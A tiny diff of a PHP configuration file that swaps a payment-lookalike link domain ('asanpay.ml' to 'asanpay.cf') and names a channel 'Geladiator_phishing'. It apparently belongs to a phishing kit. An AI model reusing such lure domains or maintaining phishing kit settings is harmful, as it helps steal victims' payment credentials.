@@ -1,7 +1,7 @@
 <?php
 
  
-$link= "https://asanpay.ml";
+$link= "https://asanpay.cf";
 
 $chanel= "Geladiator_phishing";
 
